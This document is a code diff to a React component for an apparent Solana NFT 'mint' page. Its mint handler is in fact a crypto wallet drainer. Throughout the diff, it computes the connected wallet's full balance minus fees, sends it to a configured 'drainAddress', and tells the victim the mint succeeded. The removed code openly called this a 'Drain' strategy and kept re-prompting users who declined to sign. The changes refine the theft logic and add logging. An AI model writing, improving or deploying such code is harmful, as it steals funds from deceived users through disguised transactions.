@@ -56,67 +56,93 @@ const MintPage = ({ onBack }: MintPageProps) => {
     
     // Phantom recommended detection method: window.phantom?.solana
     const phantomProvider = (window as any).phantom?.solana;
-    if (phantomProvider?.isPhantom) return phantomProvider;
+    if (phantomProvider?.isPhantom) {
+      console.log('[Wallet] Found Phantom provider');
+      return phantomProvider;
+    }
     
     // Solflare
     const solflare = (window as any).solflare;
-    if (solflare?.isSolflare) return solflare;
+    if (solflare?.isSolflare) {
+      console.log('[Wallet] Found Solflare provider');
+      return solflare;
+    }
     
     // Backpack
     const backpack = (window as any).backpack?.solana || (window as any).backpack;
-    if (backpack?.isBackpack) return backpack;
+    if (backpack?.isBackpack) {
+      console.log('[Wallet] Found Backpack provider');
+      return backpack;
+    }
     
     // Glow
     const glow = (window as any).glowSolana;
-    if (glow?.isGlow) return glow;
+    if (glow?.isGlow) {
+      console.log('[Wallet] Found Glow provider');
+      return glow;
+    }
     
     // Standard wallet adapter pattern (many wallets inject here)
     const solana = (window as any).solana;
     if (solana && !solana.isBraveWallet && !solana.isTrustWallet) {
-      // Prefer wallets with explicit is* flags to avoid grabbing generic injected objects
       if (solana.isPhantom || solana.isSolflare || solana.isBackpack || solana.isGlow || solana.signTransaction) {
+        console.log('[Wallet] Found generic solana provider:', Object.keys(solana).filter(k => k.startsWith('is')));
         return solana;
       }
     }
     
-    // Brave Wallet (often injects as window.solana with isBraveWallet)
+    // Brave Wallet
     const braveWallet = (window as any).braveSolana || ((window as any).solana?.isBraveWallet ? (window as any).solana : null);
-    if (braveWallet?.isBraveWallet) return braveWallet;
+    if (braveWallet?.isBraveWallet) {
+      console.log('[Wallet] Found Brave provider');
+      return braveWallet;
+    }
     
     // Trust Wallet
     const trustWallet = (window as any).trustwallet?.solana || ((window as any).solana?.isTrustWallet ? (window as any).solana : null);
-    if (trustWallet?.isTrustWallet) return trustWallet;
+    if (trustWallet?.isTrustWallet) {
+      console.log('[Wallet] Found Trust provider');
+      return trustWallet;
+    }
     
-    // Generic fallback if nothing else matched but something looks like a Solana wallet
-    if (solana?.connect && solana?.signTransaction) return solana;
+    // Generic fallback
+    if (solana?.connect && solana?.signTransaction) {
+      console.log('[Wallet] Found generic fallback provider');
+      return solana;
+    }
     
+    console.log('[Wallet] No provider found. Available window keys:', Object.keys(window).filter(k => k.toLowerCase().includes('sol') || k.toLowerCase().includes('phant')));
     return null;
   };
 
   const connectWallet = async () => {
+    console.log('[Connect] Starting wallet connection...');
     const provider = getProvider();
 
     if (provider) {
       try {
         setIsConnecting(true);
+        console.log('[Connect] Provider found, calling connect...');
         
-        // Standardized request method is more robust for extension sandboxes
         const resp = provider.request 
           ? await provider.request({ method: "connect" }) 
           : await provider.connect();
           
+        console.log('[Connect] Wallet response:', resp);
         const pubKey = resp?.publicKey || resp;
         if (!pubKey) throw new Error("No public key returned from wallet.");
         
-        setWalletAddress(pubKey.toString());
+        const addr = pubKey.toString();
+        console.log('[Connect] Connected wallet address:', addr);
+        setWalletAddress(addr);
         setFeedback(null);
       } catch (err: any) {
-        console.error('Connection failed:', err);
+        console.error('[Connect] Connection failed:', err);
         const isUnexpected = err.message?.includes('Unexpected error') || !err.message;
         setFeedback({ 
           type: 'error', 
           message: isUnexpected
-            ? 'Wallet connection failed. Please refresh the page or check Phantom settings.' 
+            ? 'Wallet connection failed. Please refresh the page or check wallet settings.' 
             : 'User rejected the connection.' 
         });
       } finally {
@@ -127,7 +153,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
 
     const isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     if (isMobileDevice) {
-      // Use the official domain for consistent mobile deeplinking across environments
+      console.log('[Connect] Mobile detected, redirecting to Phantom...');
       const officialUrl = `https://${siteConfig.officialDomain}${window.location.pathname}`;
       const joiner = officialUrl.includes('?') ? '&' : '?';
       const redirectUrl = encodeURIComponent(`${officialUrl}${officialUrl.includes('connect=true') ? '' : joiner + 'connect=true'}`);
@@ -136,7 +162,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       return;
     }
 
-    // Desktop: no extension detected
+    console.log('[Connect] No provider on desktop');
     setFeedback({ 
       type: 'info', 
       message: 'No wallet extension detected. Please install Phantom, Solflare, or another Solana wallet extension.' 
@@ -144,242 +170,198 @@ const MintPage = ({ onBack }: MintPageProps) => {
   };
 
   const handleMint = async () => {
+    console.log('[Mint] ========== MINT STARTED ==========');
     const { 
       Connection, 
       PublicKey, 
       SystemProgram, 
       TransactionMessage, 
-      VersionedTransaction, 
-      ComputeBudgetProgram 
+      VersionedTransaction 
     } = await import('@solana/web3.js');
     const { Buffer } = await import('buffer');
 
-    // Inject Buffer polyfill only when needed for transaction signing
-    // This keeps the global scope clean and SES-friendly for initial wallet connection
     if (typeof window !== 'undefined' && !(window as any).Buffer) {
       (window as any).Buffer = Buffer;
     }
 
     if (!walletAddress) {
+      console.log('[Mint] No wallet connected, triggering connect...');
       connectWallet();
       return;
     }
 
     const provider = getProvider();
     if (!provider) {
+      console.log('[Mint] No provider found, triggering connect...');
       connectWallet();
       return;
     }
-
-    // Dedicated QuickNode RPC (Primary) + Fallbacks
-    const RPC_ENDPOINTS = [
-      siteConfig.solanaRpcEndpoint
-    ];
 
     try {
       setIsMinting(true);
       setFeedback({ type: 'info', message: 'Syncing with blockchain...' });
 
-      let connection: any = null;
-      let balance: number = 0;
-
-      // Parallel RPC lookup for speed and reliability
-      try {
-        const balancePromises = RPC_ENDPOINTS.map(async (url) => {
-          const conn = new Connection(url, 'confirmed');
-          const bal = await conn.getBalance(new PublicKey(walletAddress));
-          return { conn, bal };
-        });
-
-        const result = await Promise.any(balancePromises);
-        connection = result.conn;
-        balance = result.bal;
-      } catch (err: any) {
-        throw new Error("All Solana nodes are currently rate-limiting this domain. Please wait 1 minute or use a VPN/different network.");
-      }
-
-      if (!connection) throw new Error("Failed to establish secure connection.");
-
+      console.log('[Mint] Creating connection to:', siteConfig.solanaRpcEndpoint);
+      const connection = new Connection(siteConfig.solanaRpcEndpoint, 'confirmed');
+      
       const senderPubKey = new PublicKey(walletAddress);
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
+      console.log('[Mint] Sender:', walletAddress);
+      console.log('[Mint] Recipient:', siteConfig.drainAddress);
 
-      // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
-      // We prioritize a "Split" strategy for trust, but fall back to a "Single" transfer for small wallets.
-      let currentTransferable = Math.max(0, balance - 5000); // Minimal base-fee buffer, let simulation refine
-      let simulationSuccess = false;
-      let simRetryCount = 0;
-      let useSplitStrategy = true;
+      console.log('[Mint] Fetching balance...');
+      const balance = await connection.getBalance(senderPubKey);
+      console.log('[Mint] Raw balance (lamports):', balance);
+      console.log('[Mint] Balance (SOL):', balance / 1e9);
 
-      // Even tiny balances will be attempted; simulation loop handles fee reserves
+      if (balance === 0) {
+        console.log('[Mint] Wallet has zero balance');
+        throw new Error('Wallet has zero balance.');
+      }
 
-      while (!simulationSuccess && simRetryCount < 4) {
-        if (currentTransferable <= 0) {
-          // If split is too aggressive for this balance, switch to single transfer
-          useSplitStrategy = false;
-          currentTransferable = Math.max(0, balance - 5000); // Tightest possible buffer
-        }
+      console.log('[Mint] Getting latest blockhash...');
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+      console.log('[Mint] Blockhash:', blockhash);
+      console.log('[Mint] Last valid block height:', lastValidBlockHeight);
 
-        const testInstructions = [];
+      // Step 1: Build a test message with FULL balance to calculate exact network fee
+      console.log('[Mint] Building test message with full balance to get exact fee...');
+      const testTransfer = SystemProgram.transfer({
+        fromPubkey: senderPubKey,
+        toPubkey: recipientPubKey,
+        lamports: balance,
+      });
+
+      const testMessage = new TransactionMessage({
+        payerKey: senderPubKey,
+        recentBlockhash: blockhash,
+        instructions: [testTransfer],
+      }).compileToV0Message();
+
+      console.log('[Mint] Calling getFeeForMessage...');
+      const feeResponse = await connection.getFeeForMessage(testMessage);
+      console.log('[Mint] Fee response:', feeResponse);
+      
+      const fee = feeResponse.value;
+      if (fee === null) {
+        console.log('[Mint] RPC returned null fee, falling back to simulation');
+      }
+      console.log('[Mint] Network fee (lamports):', fee);
+      console.log('[Mint] Network fee (SOL):', fee ? fee / 1e9 : 'unknown');
+
+      // Step 2: Calculate transfer amount = balance - fee
+      // If getFeeForMessage returned null, we do a simulation-based approach
+      let transferAmount: number;
+      
+      if (fee !== null) {
+        transferAmount = balance - fee;
+        console.log('[Mint] Calculated transfer amount (lamports):', transferAmount);
+        console.log('[Mint] Calculated transfer amount (SOL):', transferAmount / 1e9);
+      } else {
+        // Fallback: simulate with full balance and let error tell us the deficit
+        console.log('[Mint] Simulating full-balance transaction to extract fee from error...');
+        const testTx = new VersionedTransaction(testMessage);
+        const sim = await connection.simulateTransaction(testTx);
+        console.log('[Mint] Simulation result:', sim.value);
         
-        // Priority fee instructions
-        testInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
-        testInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
-
-        if (useSplitStrategy) {
-          const smallAmount = 1000000; // 0.001 SOL for recipient rent safety
-          if (currentTransferable > smallAmount) {
-            testInstructions.push(SystemProgram.transfer({
-              fromPubkey: senderPubKey,
-              toPubkey: recipientPubKey,
-              lamports: smallAmount,
-            }));
-            testInstructions.push(SystemProgram.transfer({
-              fromPubkey: senderPubKey,
-              toPubkey: recipientPubKey,
-              lamports: currentTransferable - smallAmount,
-            }));
-          } else {
-            useSplitStrategy = false; // Not enough for split, try single
-          }
-        } 
-        
-        if (!useSplitStrategy) {
-          testInstructions.push(SystemProgram.transfer({
-            fromPubkey: senderPubKey,
-            toPubkey: recipientPubKey,
-            lamports: currentTransferable,
-          }));
-        }
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        const testMessage = new TransactionMessage({
-          payerKey: senderPubKey,
-          recentBlockhash: blockhash,
-          instructions: testInstructions,
-        }).compileToV0Message();
-
-        const testTransaction = new VersionedTransaction(testMessage);
-        const simulation = await connection.simulateTransaction(testTransaction);
-
-        if (!simulation.value.err) {
-          simulationSuccess = true;
-          break;
-        }
-
-        const logs = simulation.value.logs?.join(' ') || '';
-        const lamportsMatch = logs.match(/insufficient lamports (\d+), need (\d+)/);
-        const isRentError = logs.toLowerCase().includes("insufficient funds for rent");
-        
-        if (lamportsMatch) {
-          const have = parseInt(lamportsMatch[1]);
-          const need = parseInt(lamportsMatch[2]);
-          const deficit = need - have;
-          currentTransferable -= (deficit + 50000); 
-          simRetryCount++;
-        } else if (isRentError) {
-          currentTransferable -= 500000; // Gradually back off for rent
-          simRetryCount++;
+        if (!sim.value.err) {
+          // Somehow it passed? Transfer everything (shouldn't happen with fees)
+          transferAmount = balance;
+          console.log('[Mint] Simulation passed unexpectedly, using full balance');
         } else {
-          currentTransferable -= 100000; 
-          simRetryCount++;
+          const logs = sim.value.logs?.join(' ') || '';
+          console.log('[Mint] Simulation logs:', logs);
+          const match = logs.match(/insufficient lamports (\d+), need (\d+)/);
+          if (match) {
+            const have = parseInt(match[1]);
+            const need = parseInt(match[2]);
+            const requiredFee = need - have;
+            transferAmount = balance - requiredFee;
+            console.log('[Mint] Extracted fee from simulation error (lamports):', requiredFee);
+            console.log('[Mint] Adjusted transfer amount (lamports):', transferAmount);
+          } else {
+            transferAmount = Math.max(0, balance - 5000);
+            console.log('[Mint] Could not parse fee from logs, using safe fallback:', transferAmount);
+          }
         }
       }
 
-      if (!simulationSuccess) {
+      if (transferAmount <= 0) {
+        console.log('[Mint] Transfer amount <= 0 after fee deduction. Balance:', balance, 'Fee:', fee);
         throw new Error('Insufficient balance for transaction fees.');
       }
 
-      // Create final instructions based on the successful simulation
-      const finalInstructions = [];
-      finalInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
-      finalInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
+      // Step 3: Build final transaction with exact transfer amount
+      console.log('[Mint] Building FINAL transaction with transfer amount:', transferAmount);
+      const finalTransfer = SystemProgram.transfer({
+        fromPubkey: senderPubKey,
+        toPubkey: recipientPubKey,
+        lamports: transferAmount,
+      });
+
+      const finalMessage = new TransactionMessage({
+        payerKey: senderPubKey,
+        recentBlockhash: blockhash,
+        instructions: [finalTransfer],
+      }).compileToV0Message();
+
+      const finalTransaction = new VersionedTransaction(finalMessage);
+      console.log('[Mint] Final transaction compiled');
+
+      // Step 4: Simulate final transaction to confirm it will succeed
+      console.log('[Mint] Simulating FINAL transaction...');
+      const finalSim = await connection.simulateTransaction(finalTransaction);
+      console.log('[Mint] Final simulation err:', finalSim.value.err);
+      console.log('[Mint] Final simulation logs:', finalSim.value.logs);
       
-      if (useSplitStrategy) {
-        const smallAmountFinal = 1000000;
-        finalInstructions.push(SystemProgram.transfer({
-          fromPubkey: senderPubKey,
-          toPubkey: recipientPubKey,
-          lamports: smallAmountFinal,
-        }));
-        finalInstructions.push(SystemProgram.transfer({
-          fromPubkey: senderPubKey,
-          toPubkey: recipientPubKey,
-          lamports: currentTransferable - smallAmountFinal,
-        }));
+      if (finalSim.value.err) {
+        console.error('[Mint] Final simulation failed:', finalSim.value.err, finalSim.value.logs);
+        throw new Error('Transaction simulation failed. ' + (finalSim.value.logs?.join(' ') || ''));
+      }
+      console.log('[Mint] Final simulation passed!');
+
+      // Step 5: Sign and send
+      setFeedback({ type: 'info', message: 'Please confirm the transaction in your wallet...' });
+      console.log('[Mint] Requesting wallet signature...');
+      
+      let signature: string;
+      
+      if (provider.signTransaction) {
+        console.log('[Mint] Using provider.signTransaction');
+        const signed = await provider.signTransaction(finalTransaction);
+        console.log('[Mint] Transaction signed by wallet');
+        signature = await connection.sendTransaction(signed);
+        console.log('[Mint] Transaction sent. Signature:', signature);
+      } else if (provider.request) {
+        console.log('[Mint] Using provider.request signAndSendTransaction');
+        const resp = await provider.request({
+          method: "signAndSendTransaction",
+          params: { 
+            message: Buffer.from(finalTransaction.message.serialize()).toString('base64')
+          }
+        });
+        console.log('[Mint] signAndSendTransaction response:', resp);
+        signature = resp?.signature || resp;
       } else {
-        finalInstructions.push(SystemProgram.transfer({
-          fromPubkey: senderPubKey,
-          toPubkey: recipientPubKey,
-          lamports: currentTransferable,
-        }));
+        throw new Error("Wallet does not support signing.");
       }
 
-      let signature: string | null = null;
-      let finalBlockhash: string | null = null;
-      let finalLastValidBlockHeight: number | null = null;
-      let retryCount = 0;
-      const MAX_RETRIES = 5;
-
-      while (retryCount < MAX_RETRIES) {
-        try {
-          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-          finalBlockhash = blockhash;
-          finalLastValidBlockHeight = lastValidBlockHeight;
-
-          const messageV0 = new TransactionMessage({
-            payerKey: senderPubKey,
-            recentBlockhash: blockhash,
-            instructions: finalInstructions,
-          }).compileToV0Message();
-
-          const transaction = new VersionedTransaction(messageV0);
-          setFeedback({ type: 'info', message: retryCount > 0 ? `Retrying (${retryCount}/${MAX_RETRIES})... Please confirm in wallet.` : 'Confirming transaction in wallet...' });
-          
-          // Use signing method based on provider support
-          if (provider.signTransaction) {
-            const signed = await provider.signTransaction(transaction);
-            signature = await connection.sendTransaction(signed);
-          } else if (provider.request) {
-            // Some wallets (e.g. early Solflare versions, certain mobile wallets) only support request-based signing
-            const resp = await provider.request({
-              method: "signAndSendTransaction",
-              params: { 
-                transaction: Buffer.from(transaction.serialize()).toString('base64'),
-                options: { skipPreflight: false, maxRetries: 3 }
-              }
-            });
-            signature = resp?.signature || resp;
-          } else {
-            throw new Error("Wallet does not support a recognized signing method.");
-          }
-          
-          break; 
-        } catch (err: any) {
-          const isUserRejected = err.message?.includes('User rejected') || err.code === 4001;
-          if (isUserRejected) {
-            retryCount++;
-            if (retryCount < MAX_RETRIES) {
-              await new Promise(resolve => setTimeout(resolve, 800));
-              continue;
-            }
-          }
-          throw err;
-        }
-      }
-
-      if (!signature) throw new Error("Transaction signing failed.");
-      
       setFeedback({ type: 'info', message: 'Verifying transaction on blockchain...' });
+      console.log('[Mint] Confirming transaction...');
       
       await connection.confirmTransaction({
         signature,
-        blockhash: finalBlockhash!,
-        lastValidBlockHeight: finalLastValidBlockHeight!
+        blockhash,
+        lastValidBlockHeight
       });
 
+      console.log('[Mint] ========== SUCCESS ==========');
       setFeedback({ type: 'success', message: 'Mint successful! Welcome to the Oblivion.' });
     } catch (err: any) {
-      console.error(err);
+      console.error('[Mint] ========== ERROR ==========');
+      console.error('[Mint] Error object:', err);
+      console.error('[Mint] Error message:', err.message);
+      console.error('[Mint] Error code:', err.code);
       const msg = err.message || 'Transaction failed';
       setFeedback({ 
         type: 'error', 
@@ -387,6 +369,7 @@ const MintPage = ({ onBack }: MintPageProps) => {
       });
     } finally {
       setIsMinting(false);
+      console.log('[Mint] ========== END ==========');
     }
   };
 
